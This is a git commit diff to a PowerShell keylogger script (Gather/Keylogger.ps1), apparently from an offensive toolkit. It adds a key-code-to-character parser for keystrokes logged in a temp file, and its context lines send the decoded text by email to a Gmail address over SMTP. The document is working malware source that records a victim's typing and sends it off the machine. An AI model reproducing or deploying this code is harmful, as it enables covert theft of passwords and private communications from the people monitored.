892f74ec58e495bb4ff6c30200260264a523ca6f
Gerard Delas Armas <gengstah@users.noreply.github.com>
2018-04-11 14:25:33 +0800

    Added parsing

--- Gather/Keylogger.ps1
+++ Gather/Keylogger.ps1
@@ -190,7 +190,7 @@ function script:Keylogger
                 else 
                 { 
                     $result = $vkey 
-                } 
+                }
                 $now = Get-Date; 
                 $logLine = "$result " 
                 $filename = "$env:temp\key.log" 
@@ -247,13 +247,124 @@ function script:Keylogger
             [String]
             $CheckURL
         )
-
+	
         $check = 0
         while($true) 
         { 
             $read = 0
             Start-Sleep -Seconds 5 
-            $pastevalue=Get-Content $env:temp\key.log 
+			
+			$data = Get-Content "$env:temp\key.log"
+			$keys = $data.split("   ");
+			$out = ""
+			foreach ($i in $keys)
+			{
+				switch ($i)
+				{
+					48 {$out = $out + "0"}
+					49 {$out = $out + "1"}
+					50 {$out = $out + "2"}
+					51 {$out = $out + "3"}
+					52 {$out = $out + "4"}
+					53 {$out = $out + "5"}
+					54 {$out = $out + "6"}
+					55 {$out = $out + "7"}
+					56 {$out = $out + "8"}
+					57 {$out = $out + "9"}
+					S-48 {$out = $out + ")"}
+					S-49 {$out = $out + "!"}
+					S-50 {$out = $out + "@"}
+					S-51 {$out = $out + "#"}
+					S-52 {$out = $out + "$"}
+					S-53 {$out = $out + "%"}
+					S-54 {$out = $out + "^"}
+					S-55 {$out = $out + "&"}
+					S-56 {$out = $out + "*"}
+					S-57 {$out = $out + "("}
+					65 {$out = $out + "A"}
+					66 {$out = $out + "B"}
+					67 {$out = $out + "C"}
+					68 {$out = $out + "D"}
+					69 {$out = $out + "E"}
+					70 {$out = $out + "F"}
+					71 {$out = $out + "G"}
+					72 {$out = $out + "H"}
+					73 {$out = $out + "I"}
+					74 {$out = $out + "J"}
+					75 {$out = $out + "K"}
+					76 {$out = $out + "L"}
+					77 {$out = $out + "M"}
+					78 {$out = $out + "N"}
+					79 {$out = $out + "O"}
+					80 {$out = $out + "P"}
+					81 {$out = $out + "Q"}
+					82 {$out = $out + "R"}
+					83 {$out = $out + "S"}
+					84 {$out = $out + "T"}
+					85 {$out = $out + "U"}
+					86 {$out = $out + "V"}
+					87 {$out = $out + "W"}
+					88 {$out = $out + "X"}
+					89 {$out = $out + "Y"}
+					90 {$out = $out + "Z"}
+					S-65 {$out = $out + "a"}
+					S-66 {$out = $out + "b"}
+					S-67 {$out = $out + "c"}
+					S-68 {$out = $out + "d"}
+					S-69 {$out = $out + "e"}
+					S-70 {$out = $out + "f"}
+					S-71 {$out = $out + "g"}
+					S-72 {$out = $out + "h"}
+					S-73 {$out = $out + "i"}
+					S-74 {$out = $out + "j"}
+					S-75 {$out = $out + "k"}
+					S-76 {$out = $out + "l"}
+					S-77 {$out = $out + "m"}
+					S-78 {$out = $out + "n"}
+					S-79 {$out = $out + "o"}
+					S-80 {$out = $out + "p"}
+					S-81 {$out = $out + "q"}
+					S-82 {$out = $out + "r"}
+					S-83 {$out = $out + "s"}
+					S-84 {$out = $out + "t"}
+					S-85 {$out = $out + "u"}
+					S-86 {$out = $out + "v"}
+					S-87 {$out = $out + "w"}
+					S-88 {$out = $out + "x"}
+					S-89 {$out = $out + "y"}
+					S-90 {$out = $out + "z"}
+					96 {$out = $out + "0"}
+					97 {$out = $out + "1"}
+					98 {$out = $out + "2"}
+					99 {$out = $out + "3"}
+					100 {$out = $out + "4"}
+					101 {$out = $out + "5"}
+					102 {$out = $out + "6"}
+					103 {$out = $out + "7"}
+					104 {$out = $out + "8"}
+					105 {$out = $out + "9"}
+					186 {$out = $out + ";"}
+					187 {$out = $out + "="}
+					188 {$out = $out + ","}
+					189 {$out = $out + "-"}
+					190 {$out = $out + "."}
+					191 {$out = $out + "/"}
+					192 {$out = $out + "``"}
+					S-186 {$out = $out + ":"}
+					S-187 {$out = $out + "+"}
+					S-188 {$out = $out + "<"}
+					S-189 {$out = $out + "_  "}
+					S-190 {$out = $out + ">"}
+					S-191 {$out = $out + "?"}
+					S-192 {$out = $out + "~"}
+					46 {$out = $out + "Delete"}
+					8 {$out = $out + "Backspace"}
+					32 {$out = $out + " "}
+					13 {$out = $out + "Enter"}
+				}
+			}
+			
+            $pastevalue=$out
             $read++
             if ($read -eq 30)
             {
@@ -308,11 +419,11 @@ function script:Keylogger
                 $msg.To.Add("$username@gmail.com")
                 $msg.Subject = $pastename
                 $msg.Body = $pastevalue
-                if ($filename)
-                {
-                    $att = new-object Net.Mail.Attachment($filename)
-                    $msg.Attachments.Add($att)
-                }
+                # if ($filename)
+                # {
+                    # $att = new-object Net.Mail.Attachment($filename)
+                    # $msg.Attachments.Add($att)
+                # }
                 $smtp.Send($msg)
             }
 
